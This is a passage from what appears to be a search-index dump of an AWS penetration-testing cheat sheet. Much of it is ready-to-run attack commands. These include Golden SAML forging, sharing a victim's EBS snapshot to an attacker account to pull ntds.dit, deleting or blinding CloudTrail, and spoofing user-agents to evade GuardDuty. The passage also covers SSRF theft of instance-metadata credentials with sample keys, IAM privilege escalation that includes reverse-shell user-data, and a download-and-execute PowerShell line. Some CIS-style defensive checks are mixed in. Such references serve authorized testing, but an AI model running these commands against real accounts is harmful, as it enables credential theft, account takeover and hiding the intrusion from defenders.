Mimikatz) * IdP public certificate * IdP name * Role name (role to assume) $ python -m pip install boto3 botocore defusedxml enum python_dateutil lxml signxml $ python .\\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 AWS - Shadow Copy attack Prerequisite: * EC2:CreateSnapshot * CloudCopy - https://github.com/Static-Flow/CloudCopy Load AWS CLI with Victim Credentials that have at least CreateSnapshot permissions Run \"Describe-Instances\" and show in list for attacker to select Run \"Create-Snapshot\" on volume of selected instance Run \"modify-snapshot-attribute\" on new snapshot to set \"createVolumePermission\" to attacker AWS Account Load AWS CLI with Attacker Credentials Run \"run-instance\" command to create new linux ec2 with our stolen snapshot Ssh run \"sudo mkdir /windows\" Ssh run \"sudo mount /dev/xvdf1 /windows/\" Ssh run \"sudo cp /windows/Windows/NTDS/ntds.dit /home/ec2-user\" Ssh run \"sudo cp /windows/Windows/System32/config/SYSTEM /home/ec2-user\" Ssh run \"sudo chown ec2-user:ec2-user /home/ec2-user/*\" SFTP get \"/home/ec2-user/SYSTEM ./SYSTEM\" SFTP get \"/home/ec2-user/ntds.dit ./ntds.dit\" locally run \"secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local -outputfile secrets' , expects secretsdump to be on path Disable CloudTrail $ aws cloudtrail delete-trail --name cloudgoat_trail --profile administrator Disable monitoring of events from global services $ aws cloudtrail update-trail --name cloudgoat_trail --no-include-global-service-event Disable Cloud Trail on specific regions $ aws cloudtrail update-trail --name cloudgoat_trail --no-include-global-service-event --no-is-multi-region --region=eu-west Cover tracks by obfuscating Cloudtrail logs and Guard Duty :warning: When using awscli on Kali Linux, Pentoo and Parrot Linux, a log is generated based on the user-agent. Pacu bypass this problem by defining a custom User-Agent (https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu.py#L1473) boto3_session = boto3.session.Session() ua = boto3_session._session.user_agent() if 'kali' in ua.lower() or 'parrot' in ua.lower() or 'pentoo' in ua.lower(): # If the local OS is Kali/Parrot/Pentoo Linux # GuardDuty triggers a finding around API calls made from Kali Linux, so let's avoid that... self.print('Detected environment as one of Kali/Parrot/Pentoo Linux. Modifying user agent to hide that from GuardDuty...') DynamoDB Amazon DynamoDB is a key-value and document database that delivers single-digit millisecond performance at any scale. It's a fully managed, multi-region, multi-active, durable database with built-in security, backup and restore, and in-memory caching for internet-scale applications. DynamoDB can handle more than 10 trillion requests per day and can support peaks of more than 20 million requests per second. list tables $ aws --endpoint-url http://s3.bucket.htb dynamodb list-tables { \"TableNames\": [ \"users\" ] } enumerate table content $ aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users | jq -r '.Items[]' { \"password\": { \"S\": \"Management@#1@#\" }, \"username\": { \"S\": \"Mgmt\" } } Security checks https://github.com/DenizParlak/Zeus Identity and Access Management Avoid the use of the \"root\" account Ensure multi-factor authentication (MFA) is enabled for all IAM users that have a console password Ensure credentials unused for 90 days or greater are disabled Ensure access keys are rotated every 90 days or less Ensure IAM password policy requires at least one uppercase letter Ensure IAM password policy requires at least one lowercase letter Ensure IAM password policy requires at least one symbol Ensure IAM password policy requires at least one number Ensure IAM password policy requires minimum length of 14 or greater Ensure no root account access key exists Ensure MFA is enabled for the \"root\" account Ensure security questions are registered in the AWS account Ensure IAM policies are attached only to groups or role Enable detailed billing Maintain current contact details Ensure security contact information is registered Ensure IAM instance roles are used for AWS resource access from instances Logging Ensure CloudTrail is enabled in all regions Ensure CloudTrail log file validation is enabled Ensure the S3 bucket CloudTrail logs to is not publicly accessible Ensure CloudTrail trails are integrated with CloudWatch Logs Ensure AWS Config is enabled in all regions Ensure S3 bucket access logging is enabled on the CloudTrail S3 bucket Ensure CloudTrail logs are encrypted at rest using KMS CMKs Ensure rotation for customer created CMKs is enabled Networking Ensure no security groups allow ingress from 0.0.0.0/0 to port 22 Ensure no security groups allow ingress from 0.0.0.0/0 to port 3389 Ensure VPC flow logging is enabled in all VPC Ensure the default security group of every VPC restricts all traffic Monitoring Ensure a log metric filter and alarm exist for unauthorized API calls Ensure a log metric filter and alarm exist for Management Consolesign-in without MFA Ensure a log metric filter and alarm exist for usage of \"root\" account Ensure a log metric filter and alarm exist for IAM policy changes Ensure a log metric filter and alarm exist for CloudTrail configuration changes Ensure a log metric filter and alarm exist for AWS Management Console authentication failures Ensure a log metric filter and alarm exist for disabling or scheduled deletion of customer created CMKs Ensure a log metric filter and alarm exist for S3 bucket policy changes Ensure a log metric filter and alarm exist for AWS Config configuration changes Ensure a log metric filter and alarm exist for security group changes Ensure a log metric filter and alarm exist for changes to NetworkAccess Control Lists (NACL) Ensure a log metric filter and alarm exist for changes to network gateways Ensure a log metric filter and alarm exist for route table changes Ensure a log metric filter and alarm exist for VPC changes References An introduction to penetration testing AWS - Graceful Security Cloud Shadow Admin Threat 10 Permissions Protect - CyberArk My arsenal of AWS Security tools - toniblyx AWS Privilege Escalation method mitigation - RhinoSecurityLabs AWS CLI Cheatsheet - apolloclark Pacu Open source AWS Exploitation framework - RhinoSecurityLabs PACU Spencer Gietzen - 30 juil. 2018 Cloud security instance metadata - PumaScan Privilege escalation in the Cloud: From SSRF to Global Account Administrator - Maxime Leblanc - Sep 1, 2018 AWS - Cheatsheet - @Magnussen amazon-guardduty-user-guide PenTest Finding Types - @awsdocs HOW I HACKED A WHOLE EC2 NETWORK DURING A PENETRATION TEST - by Federico Fernandez How to Attach and Mount an EBS volume to EC2 Linux Instance - AUGUST 17, 2016 Getting shell and data access in AWS by chaining vulnerabilities - Riyaz Walikar - Aug 29, 2019 Getting started with Version 2 of AWS EC2 Instance Metadata service (IMDSv2) - Sunesh Govindaraj - Nov 25, 2019 Gaining AWS Console Access via API Keys - Ian Williams - March 18th, 2020 AWS API calls that return credentials - kmcquade","title":"AWS"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws","text":"Amazon Web Services offers reliable, scalable, and inexpensive cloud computing services.","title":"AWS"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#summary","text":"AWS Summary Training Tools AWS Patterns AWS - Metadata SSRF Method for Elastic Cloud Compute (EC2) Method for Container Service (Fargate) AWS API calls that return credentials AWS - Shadow Admin Admin equivalent permission AWS - Gaining AWS Console Access via API Keys AWS - Enumerate IAM permissions AWS - Mount EBS volume to EC2 Linux AWS - Copy EC2 using AMI Image AWS - Instance Connect - Push an SSH key to EC2 instance AWS - Lambda - Extract function's code AWS - SSM - Command execution AWS - Golden SAML Attack AWS - Shadow Copy attack Disable CloudTrail Cover tracks by obfuscating Cloudtrail logs and Guard Duty DynamoDB Security checks References","title":"Summary"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#training","text":"Damn Vulnerable Cloud Application - https://medium.com/poka-techblog/privilege-escalation-in-the-cloud-from-ssrf-to-global-account-administrator-fd943cf5a2f6 SadCloud - https://github.com/nccgroup/sadcloud Flaws - http://flaws.cloud Cloudgoat - https://github.com/RhinoSecurityLabs/cloudgoat","title":"Training"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#tools","text":"SkyArk - Discover the most privileged users in the scanned AWS environment, including the AWS Shadow Admins Requires read-Only permissions over IAM service ```powershell $ git clone https://github.com/cyberark/SkyArk $ powershell -ExecutionPolicy Bypass -NoProfile PS C> Import-Module .\\SkyArk.ps1 -force PS C> Start-AWStealth or in the Cloud Console PS C> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cyberark/SkyArk/master/AWStealth/AWStealth.ps1') PS C> Scan-AWShadowAdmins ``` Pacu - Exploit configuration flaws within an AWS environment using an extensible collection of modules with a diverse feature-set Requires AWS Keys ```powershell $ git clone https://github.com/RhinoSecurityLabs/pacu $ bash install.sh $ python3 pacu.py set_keys/swap_keys ls run [--keyword-arguments] run --regions eu-west-1,us-west-1","title":"Tools"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#httpsgithubcomrhinosecuritylabspacuwikimodule-details","text":"``` Bucket Finder - Search for public buckets, list and download all files if directory indexing is enabled ```powershell wget https://digi.ninja/files/bucket_finder_1.1.tar.bz2 -O bucket_finder_1.1.tar.bz2 ./bucket_finder.rb my_words ./bucket_finder.rb --region ie my_words US Standard = http://s3.amazonaws.com Ireland = http://s3-eu-west-1.amazonaws.com Northern California = http://s3-us-west-1.amazonaws.com Singapore = http://s3-ap-southeast-1.amazonaws.com Tokyo = http://s3-ap-northeast-1.amazonaws.com ./bucket_finder.rb --download --region ie my_words ./bucket_finder.rb --log-file bucket.out my_words ``` Boto3 - Amazon Web Services (AWS) SDK for Python ```python import boto3 # Create an S3 client s3 = boto3.client('s3',aws_access_key_id='AKIAJQDP3RKREDACTED',aws_secret_access_key='igH8yFmmpMbnkcUaCqXJIRIozKVaREDACTED',region_name='us-west-1') try: result = s3.list_buckets() print(result) except Exception as e: print(e) ``` Prowler - AWS security best practices assessments, audits, incident response, continuous monitoring, hardening and forensics readiness It follows guidelines of the CIS Amazon Web Services Foundations Benchmark and DOZENS of additional checks including GDPR and HIPAA (+100). * Require: arn:aws:iam::aws:policy/SecurityAudit powershell $ pip install awscli ansi2html detect-secrets $ git clone https://github.com/toniblyx/prowler $ sudo apt install jq $ ./prowler -E check42,check43 $ ./prowler -p custom-profile -r us-east-1 -c check11 $ ./prowler -A 123456789012 -R ProwlerRole # sts assume-role Principal Mapper - A tool for quickly evaluating IAM permissions in AWS ```powershell https://github.com/nccgroup/PMapper pip install principalmapper pmapper graph --create pmapper visualize --filetype png pmapper analysis --output-type text","title":"https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#determine-if-poweruser-can-escalate-privileges","text":"pmapper query \"preset privesc user/PowerUser\" pmapper argquery --principal user/PowerUser --preset privesc","title":"Determine if PowerUser can escalate privileges"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#find-all-principals-that-can-escalate-privileges","text":"pmapper query \"preset privesc \" pmapper argquery --principal ' ' --preset privesc","title":"Find all principals that can escalate privileges"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#find-all-principals-that-poweruser-can-access","text":"pmapper query \"preset connected user/PowerUser \" pmapper argquery --principal user/PowerUser --resource ' ' --preset connected","title":"Find all principals that PowerUser can access"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#find-all-principals-that-can-access-poweruser","text":"pmapper query \"preset connected * user/PowerUser\" pmapper argquery --principal '*' --resource user/PowerUser --preset connected ``` ScoutSuite - Multi-Cloud Security Auditing Tool powershell $ git clone https://github.com/nccgroup/ScoutSuite $ python scout.py PROVIDER --help # The --session-token is optional and only used for temporary credentials (i.e. role assumption). $ python scout.py aws --access-keys --access-key-id <AKIAIOSFODNN7EXAMPLE> --secret-access-key <wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY> --session-token <token> $ python scout.py azure --cli s3_objects_check - Whitebox evaluation of effective S3 object permissions, to identify publicly accessible files powershell $ git clone https://github.com/nccgroup/s3_objects_check $ python3 -m venv env && source env/bin/activate $ pip install -r requirements.txt $ python s3-objects-check.py -h $ python s3-objects-check.py -p whitebox-profile -e blackbox-profile cloudsplaining - An AWS IAM Security Assessment tool that identifies violations of least privilege and generates a risk-prioritized report powershell $ pip3 install --user cloudsplaining $ cloudsplaining download --profile myawsprofile $ cloudsplaining scan --input-file default.json weirdAAL - AWS Attack Library powershell python3 weirdAAL.py -m ec2_describe_instances -t demo python3 weirdAAL.py -m lambda_get_account_settings -t demo python3 weirdAAL.py -m lambda_get_function -a 'MY_LAMBDA_FUNCTION','us-west-2' -t yolo cloudmapper - CloudMapper helps you analyze your Amazon Web Services (AWS) environments powershell git clone https://github.com/duo-labs/cloudmapper.git # sudo yum install autoconf automake libtool python3-devel.x86_64 python3-tkinter python-pip jq awscli # You may additionally need \"build-essential\" sudo apt-get install autoconf automake libtool python3.7-dev python3-tk jq awscli pipenv install --skip-lock pipenv shell report: Generate HTML report. Includes summary of the accounts and audit findings. iam_report: Generate HTML report for the IAM information of an account. audit: Check for potential misconfigurations. collect: Collect metadata about an account. find_admins: Look at IAM policies to identify admin users and roles, or principals with specific privileges dufflebag - Find secrets that are accidentally exposed via Amazon EBS\u2019s \u201cpublic\u201d mode","title":"Find all principals that can access PowerUser"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-patterns","text":"Service URL s3 https://{user_provided}.s3.amazonaws.com cloudfront https://{random_id}.cloudfront.net ec2 ec2-{ip-seperated}.compute-1.amazonaws.com es https://{user_provided}-{random_id}.{region}.es.amazonaws.com elb http://{user_provided}-{random_id}.{region}.elb.amazonaws.com:80/443 elbv2 https://{user_provided}-{random_id}.{region}.elb.amazonaws.com rds mysql://{user_provided}.{random_id}.{region}.rds.amazonaws.com:3306 rds postgres://{user_provided}.{random_id}.{region}.rds.amazonaws.com:5432 route 53 {user_provided} execute-api https://{random_id}.execute-api.{region}.amazonaws.com/{user_provided} cloudsearch https://doc-{user_provided}-{random_id}.{region}.cloudsearch.amazonaws.com transfer sftp://s-{random_id}.server.transfer.{region}.amazonaws.com iot mqtt://{random_id}.iot.{region}.amazonaws.com:8883 iot https://{random_id}.iot.{region}.amazonaws.com:8443 iot https://{random_id}.iot.{region}.amazonaws.com:443 mq https://b-{random_id}-{1,2}.mq.{region}.amazonaws.com:8162 mq ssl://b-{random_id}-{1,2}.mq.{region}.amazonaws.com:61617 kafka b-{1,2,3,4}.{user_provided}.{random_id}.c{1,2}.kafka.{region}.amazonaws.com kafka {user_provided}.{random_id}.c{1,2}.kafka.useast-1.amazonaws.com cloud9 https://{random_id}.vfs.cloud9.{region}.amazonaws.com mediastore https://{random_id}.data.mediastore.{region}.amazonaws.com kinesisvideo https://{random_id}.kinesisvideo.{region}.amazonaws.com mediaconvert https://{random_id}.mediaconvert.{region}.amazonaws.com mediapackage https://{random_id}.mediapackage.{region}.amazonaws.com/in/v1/{random_id}/channel","title":"AWS Patterns"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-metadata-ssrf","text":"AWS released additional security defences against the attack. :warning: Only working with IMDSv1. Enabling IMDSv2 : aws ec2 modify-instance-metadata-options --instance-id <INSTANCE-ID> --profile <AWS_PROFILE> --http-endpoint enabled --http-token required . In order to usr IMDSv2 you must provide a token. export TOKEN=`curl -X PUT -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" \"http://169.254.169.254/latest/api/token\"` curl -H \"X-aws-ec2-metadata-token:$TOKEN\" -v \"http://169.254.169.254/latest/meta-data\"","title":"AWS - Metadata SSRF"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#method-for-elastic-cloud-compute-ec2","text":"Example : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-Role/ Access the IAM : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/ powershell ami-id ami-launch-index ami-manifest-path block-device-mapping/ events/ hostname iam/ identity-credentials/ instance-action instance-id Find the name of the role assigned to the instance : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/ Extract the role's temporary keys : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-Role/ powershell { \"Code\" : \"Success\", \"LastUpdated\" : \"2019-07-31T23:08:10Z\", \"Type\" : \"AWS-HMAC\", \"AccessKeyId\" : \"ASIA54BL6PJR37YOEP67\", \"SecretAccessKey\" : \"OiAjgcjm1oi2xxxxxxxxOEXkhOMhCOtJMP2\", \"Token\" : \"AgoJb3JpZ2luX2VjEDU86Rcfd/34E4rtgk8iKuTqwrRfOppiMnv\", \"Expiration\" : \"2019-08-01T05:20:30Z\" }","title":"Method for Elastic Cloud Compute (EC2)"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#method-for-container-service-fargate","text":"Fetch the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI variable from https://awesomeapp.com/download?file=/proc/self/environ powershell JAVA_ALPINE_VERSION=8.212.04-r0 HOSTNAME=bbb3c57a0ed3SHLVL=1PORT=8443HOME=/root AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447 AWS_EXECUTION_ENV=AWS_ECS_FARGATEMVN_VER=3.3.9JAVA_VERSION=8u212AWS_DEFAULT_REGION=us-west-2 ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/cb4f6285-48f2-4a51-a787-67dbe61c13ffPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin:/usr/lib/mvn:/usr/lib/mvn/binLANG=C.UTF-8AWS_REGION=us-west-2Tag=48111bbJAVA_HOME=/usr/lib/jvm/java-1.8-openjdk/jreM2=/usr/lib/mvn/binPWD=/appM2_HOME=/usr/lib/mvnLD_LIBRARY_PATH=/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64/server:/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64:/usr/lib/jvm/java-1.8-openjd Use the credential URL to dump the AccessKey and SecretKey : https://awesomeapp.com/forward?target=http://169.254.170.2/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447 powershell { \"RoleArn\": \"arn:aws:iam::953574914659:role/awesome-waf-role\", \"AccessKeyId\": \"ASIA54BL6PJR2L75XHVS\", \"SecretAccessKey\": \"j72eTy+WHgIbO6zpe2DnfjEhbObuTBKcemfrIygt\", \"Token\": \"FQoGZXIvYXdzEMj//////////wEaDEQW+wwBtaoyqH5lNSLGBF3PnwnLYa3ggfKBtLMoWCEyYklw6YX85koqNwKMYrP6ymcjv4X2gF5enPi9/Dx6m/1TTFIwMzZ3tf4V3rWP3HDt1ea6oygzTrWLvfdp57sKj+2ccXI+WWPDZh3eJr4Wt4JkiiXrWANn7Bx3BUj9ZM11RXrKRCvhrxdrMLoewRkWmErNEOFgbaCaT8WeOkzqli4f+Q36ZerT2V+FJ4SWDX1CBsimnDAMAdTIRSLFxVBBwW8171OHiBOYAMK2np1xAW1d3UCcZcGKKZTjBee2zs5+Rf5Nfkoq+j7GQkmD2PwCeAf0RFETB5EVePNtlBWpzfOOVBtsTUTFewFfx5cyNsitD3C2N93WR59LX/rNxyncHGDUP/6UPlasOcfzAaG738OJQmWfQTR0qksHIc2qiPtkstnNndh76is+r+Jc4q3wOWu2U2UBi44Hj+OS2UTpMAwc/MshIiGsUOrBQdPqcLLdAxKpUNTdSQNLg5wv4f2OrOI8/sneV58yBRolBz8DZoH8wohtLXpueDt8jsVSVLznnMOOe/4ehHE2Nt+Fy+tjaY5FUi/Ijdd5IrIdIvWFHY1XcPopUFYrDqr0yuZvX1YddfIcfdbmxf274v69FuuywXTo7cXk1QTMYZWlD/dPI/k6KQeO446UrHT9BJxcJMpchAIVRpI7nVKkSDwku1joKUG7DOeycuAbhecVZG825TocL0ks2yXPnIdvckAaU9DZf+afIV3Nxv3TI4sSX1npBhb2f/8C31pv8VHyu2NiN5V6OOHzZijHsYXsBQ==\", \"Expiration\": \"2019-09-18T04:05:59Z\" }","title":"Method for Container Service (Fargate)"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-api-calls-that-return-credentials","text":"chime:createapikey codepipeline:pollforjobs cognito-identity:getopenidtoken cognito-identity:getopenidtokenfordeveloperidentity cognito-identity:getcredentialsforidentity connect:getfederationtoken connect:getfederationtokens ecr:getauthorizationtoken gamelift:requestuploadcredentials iam:createaccesskey iam:createloginprofile iam:createservicespecificcredential iam:resetservicespecificcredential iam:updateaccesskey lightsail:getinstanceaccessdetails lightsail:getrelationaldatabasemasteruserpassword rds-db:connect redshift:getclustercredentials sso:getrolecredentials mediapackage:rotatechannelcredentials mediapackage:rotateingestendpointcredentials sts:assumerole sts:assumerolewithsaml sts:assumerolewithwebidentity sts:getfederationtoken sts:getsessiontoken","title":"AWS API calls that return credentials"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-shadow-admin","text":"","title":"AWS - Shadow Admin"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#admin-equivalent-permission","text":"AdministratorAccess powershell \"Action\": \"*\" \"Resource\": \"*\" ec2:AssociateIamInstanceProfile iam:CreateAccessKey iam:CreateAccessKey : create a new access key to another IAM admin account powershell aws iam create-access-key \u2013user-name target_user iam:CreateLoginProfile : add a new password-based login profile, set a new password for an entity and impersonate it powershell $ aws iam create-login-profile \u2013user-name target_user \u2013password '|[3rxYGGl3@`~68)O{,-$1B\u201dzKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\\\hq.#@dh49\u2033=fT;|,lyTKOLG7J[qH$LV5U<9`O~Z\u201d,jJ[iT-D^(' \u2013no-password-reset-required iam:UpdateLoginProfile : reset other IAM users\u2019 login passwords. powershell $ aws iam update-login-profile \u2013user-name target_user \u2013password '|[3rxYGGl3@`~68)O{,-$1B\u201dzKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\\\hq.#@dh49\u2033=fT;|,lyTKOLG7J[qH$LV5U<9`O~Z\u201d,jJ[iT-D^(' \u2013no-password-reset-required iam:AttachUserPolicy , iam:AttachGroupPolicy or iam:AttachRolePolicy : attach existing admin policy to any other entity he currently possesses powershell $ aws iam attach-user-policy \u2013user-name my_username \u2013policy-arn arn:aws:iam::aws:policy/AdministratorAccess $ aws iam attach-user-policy \u2013user-name my_username \u2013policy-arn arn:aws:iam::aws:policy/AdministratorAccess $ aws iam attach-role-policy \u2013role-name role_i_can_assume \u2013policy-arn arn:aws:iam::aws:policy/AdministratorAccess iam:PutUserPolicy , iam:PutGroupPolicy or iam:PutRolePolicy : added inline policy will allow the attacker to grant additional privileges to previously compromised entities. powershell $ aws iam put-user-policy \u2013user-name my_username \u2013policy-name my_inline_policy \u2013policy-document file://path/to/administrator/policy.json iam:CreatePolicy : add a stealthy admin policy iam:AddUserToGroup : add into the admin group of the organization. powershell $ aws iam add-user-to-group \u2013group-name target_group \u2013user-name my_username iam:UpdateAssumeRolePolicy + sts:AssumeRole : change the assuming permissions of a privileged role and then assume it with a non-privileged account. powershell $ aws iam update-assume-role-policy \u2013role-name role_i_can_assume \u2013policy-document file://path/to/assume/role/policy.json iam:CreatePolicyVersion & iam:SetDefaultPolicyVersion : change customer-managed policies and change a non-privileged entity to be a privileged one. powershell $ aws iam create-policy-version \u2013policy-arn target_policy_arn \u2013policy-document file://path/to/administrator/policy.json \u2013set-as-default $ aws iam set-default-policy-version \u2013policy-arn target_policy_arn \u2013version-id v2 lambda:UpdateFunctionCode : give an attacker access to the privileges associated with the Lambda service role that is attached to that function. powershell $ aws lambda update-function-code \u2013function-name target_function \u2013zip-file fileb://my/lambda/code/zipped.zip glue:UpdateDevEndpoint : give an attacker access to the privileges associated with the role attached to the specific Glue development endpoint. powershell $ aws glue \u2013endpoint-name target_endpoint \u2013public-key file://path/to/my/public/ssh/key.pub iam:PassRole + ec2:CreateInstanceProfile / ec2:AddRoleToInstanceProfile : an attacker could create a new privileged instance profile and attach it to a compromised EC2 instance that he possesses. iam:PassRole + ec2:RunInstance : give an attacker access to the set of permissions that the instance profile/role has, which again could range from no privilege escalation to full administrator access of the AWS account. powershell # add ssh key $ aws ec2 run-instances \u2013image-id ami-a4dc46db \u2013instance-type t2.micro \u2013iam-instance-profile Name=iam-full-access-ip \u2013key-name my_ssh_key \u2013security-group-ids sg-123456 # execute a reverse shell $ aws ec2 run-instances \u2013image-id ami-a4dc46db \u2013instance-type t2.micro \u2013iam-instance-profile Name=iam-full-access-ip \u2013user-data file://script/with/reverse/shell.sh iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction : give a user access to the privileges associated with any Lambda service role that exists in the account. powershell $ aws lambda create-function \u2013function-name my_function \u2013runtime python3.6 \u2013role arn_of_lambda_role \u2013handler lambda_function.lambda_handler \u2013code file://my/python/code.py $ aws lambda invoke \u2013function-name my_function output.txt Example of code.py python import boto3 def lambda_handler(event, context): client = boto3.client('iam') response = client.attach_user_policy( UserName='my_username', PolicyArn=\"arn:aws:iam::aws:policy/AdministratorAccess\" ) return response iam:PassRole + glue:CreateDevEndpoint : access to the privileges associated with any Glue service role that exists in the account. powershell $ aws glue create-dev-endpoint \u2013endpoint-name my_dev_endpoint \u2013role-arn arn_of_glue_service_role \u2013public-key file://path/to/my/public/ssh/key.pub","title":"Admin equivalent permission"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-gaining-aws-console-access-via-api-keys","text":"A utility to convert your AWS CLI credentials into AWS console access. $> git clone https://github.com/NetSPI/aws_consoler $> aws_consoler -v -a AKIA[REDACTED] -s [REDACTED] 2020-03-13 19:44:57,800 [aws_consoler.cli] INFO: Validating arguments... 2020-03-13 19:44:57,801 [aws_consoler.cli] INFO: Calling logic. 2020-03-13 19:44:57,820 [aws_consoler.logic] INFO: Boto3 session established. 2020-03-13 19:44:58,193 [aws_consoler.logic] WARNING: Creds still permanent, creating federated session. 2020-03-13 19:44:58,698 [aws_consoler.logic] INFO: New federated session established. 2020-03-13 19:44:59,153 [aws_consoler.logic] INFO: Session valid, attempting to federate as arn:aws:sts::123456789012:federated-user/aws_consoler. 2020-03-13 19:44:59,668 [aws_consoler.logic] INFO: URL generated! https://signin.aws.amazon.com/federation?Action=login&Issuer=consoler.local&Destination=https%3A%2F%2Fconsole.aws.amazon.com%2Fconsole%2Fhome%3Fregion%3Dus-east-1&SigninToken=[REDACTED","title":"AWS - Gaining AWS Console Access via API Keys"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-enumerate-iam-permissions","text":"Enumerate the permissions associated with AWS credential set with enumerate-iam git clone git@github.com:andresriancho/enumerate-iam.git pip install -r requirements.txt ./enumerate-iam.py --access-key AKIA... --secret-key StF0q... 2019-05-10 15:57:58,447 - 21345 - [INFO] Starting permission enumeration for access-key-id \"AKIA...\" 2019-05-10 15:58:01,532 - 21345 - [INFO] Run for the hills, get_account_authorization_details worked! 2019-05-10 15:58:01,537 - 21345 - [INFO] -- { \"RoleDetailList\": [ { \"Tags\": [], \"AssumeRolePolicyDocument\": { \"Version\": \"2008-10-17\", \"Statement\": [ { ... 2019-05-10 15:58:26,709 - 21345 - [INFO] -- gamelift.list_builds() worked! 2019-05-10 15:58:26,850 - 21345 - [INFO] -- cloudformation.list_stack_sets() worked! 2019-05-10 15:58:26,982 - 21345 - [INFO] -- directconnect.describe_locations() worked! 2019-05-10 15:58:27,021 - 21345 - [INFO] -- gamelift.describe_matchmaking_rule_sets() worked! 2019-05-10 15:58:27,311 - 21345 - [INFO] -- sqs.list_queues() worked!","title":"AWS - Enumerate IAM permissions"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-mount-ebs-volume-to-ec2-linux","text":":warning: EBS snapshots are block-level incremental, which means that every snapshot only copies the blocks (or areas) in the volume that had been changed since the last snapshot. To restore your data, you need to create a new EBS volume from one of your EBS snapshots. The new volume will be a duplicate of the initial EBS volume on which the snapshot was taken. Head over to EC2 \u2013> Volumes and create a new volume of your preferred size and type. Select the created volume, right click and select the \"attach volume\" option. Select the instance from the instance text box as shown below : attach ebs volume aws ec2 create-volume \u2013snapshot-id snapshot_id --availability-zone zone aws ec2 attach-volume \u2013-volume-id volume_id \u2013-instance-id instance_id --device device Now, login to your ec2 instance and list the available disks using the following command : lsblk Check if the volume has any data using the following command : sudo file -s /dev/xvdf Format the volume to ext4 filesystem using the following command : sudo mkfs -t ext4 /dev/xvdf Create a directory of your choice to mount our new ext4 volume. I am using the name \u201cnewvolume\u201d : sudo mkdir /newvolume Mount the volume to \"newvolume\" directory using the following command : sudo mount /dev/xvdf /newvolume/ cd into newvolume directory and check the disk space for confirming the volume mount : cd /newvolume; df -h .","title":"AWS - Mount EBS volume to EC2 Linux"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-copy-ec2-using-ami-image","text":"First you need to extract data about the current instances and their AMI/security groups/subnet : aws ec2 describe-images --region eu-west-1 # create a new image for the instance-id $ aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name \"AWS Audit\" --description \"Export AMI\" --region eu-west-1 # add key to AWS $ aws ec2 import-key-pair --key-name \"AWS Audit\" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1 # create ec2 using the previously created AMI, use the same security group and subnet to connect easily. $ aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids \"sg-6d0d7f01\" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name \"AWS Audit\" --query \"Instances[0].InstanceId\" --region eu-west-1 # now you can check the instance aws ec2 describe-instances --instance-ids i-0546910a0c18725a1 # If needed : edit groups aws ec2 modify-instance-attribute --instance-id \"i-0546910a0c18725a1\" --groups \"sg-6d0d7f01\" --region eu-west-1 # be a good guy, clean our instance to avoid any useless cost aws ec2 stop-instances --instance-id \"i-0546910a0c18725a1\" --region eu-west-1 aws ec2 terminate-instances --instance-id \"i-0546910a0c18725a1\" --region eu-west-1","title":"AWS - Copy EC2 using AMI Image"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/#aws-instance-connect-push-an-ssh-key-to-ec2-instance","text":"# https://aws.amazon.com/fr/blogs/compute/new-using-amazon-ec2-instance-connect-for-ssh-access-to-your-ec2-instances/ $ 